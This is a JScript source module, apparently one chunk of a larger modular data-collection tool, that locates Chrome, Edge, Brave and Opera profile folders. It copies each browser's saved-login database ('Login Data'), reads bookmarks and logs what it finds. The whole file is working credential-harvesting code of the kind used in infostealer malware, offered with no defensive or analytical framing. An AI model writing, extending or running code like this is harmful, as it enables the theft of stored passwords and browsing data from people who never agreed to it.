// chunk: collectors/browser_chromium
// depends: core/emit_buffer, core/run_cmd, core/file_ops
// provides: collect_browsers
// format: jscript

function collect_browsers() {
    emit("\r\n=== BROWSER DATA ===\r\n");
    var local = _s.ExpandEnvironmentStrings("%LOCALAPPDATA%");
    var browsers = [
        {name: "Chrome", path: local + "\\Google\\Chrome\\User Data"},
        {name: "Edge", path: local + "\\Microsoft\\Edge\\User Data"},
        {name: "Brave", path: local + "\\BraveSoftware\\Brave-Browser\\User Data"},
        {name: "Opera", path: _s.ExpandEnvironmentStrings("%APPDATA%") + "\\Opera Software\\Opera Stable"}
    ];
    for (var i = 0; i < browsers.length; i++) {
        var b = browsers[i];
        if (_fso.FolderExists(b.path)) {
            emit("  " + b.name + ": INSTALLED at " + b.path + "\r\n");
            var loginDb = b.path + "\\Default\\Login Data";
            var histDb = b.path + "\\Default\\History";
            var bookmarks = b.path + "\\Default\\Bookmarks";
            if (file_exists(loginDb)) {
                emit("    Login Data: EXISTS (" + _fso.GetFile(loginDb).Size + " bytes)\r\n");
                var copied = grab_file(loginDb, "login_" + b.name.toLowerCase());
                if (copied.length > 0) emit("    [LOGIN_DB copied: " + copied.length + " bytes]\r\n");
            }
            if (file_exists(histDb)) emit("    History: EXISTS\r\n");
            if (file_exists(bookmarks)) {
                var bk = read_file(bookmarks, 65536);
                if (bk.length > 0) emit("    Bookmarks: " + bk.length + " bytes\r\n");
            }
        }
    }
}
